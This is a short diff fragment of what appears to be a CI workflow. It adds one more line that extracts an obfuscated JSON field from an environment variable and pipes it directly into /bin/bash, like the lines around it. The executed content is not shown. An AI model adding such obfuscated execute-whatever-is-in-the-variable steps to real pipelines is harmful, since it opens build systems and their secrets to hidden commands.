@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$pj45191" | jq -r .aswdv27069 | /bin/bash
           echo $kim273 | jq -r .utrcw83081 | /bin/bash
           printf '%s' "$r6" | jq -r .ojea27139 | /bin/bash
+          echo $wa6 | jq -r .xlh527 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
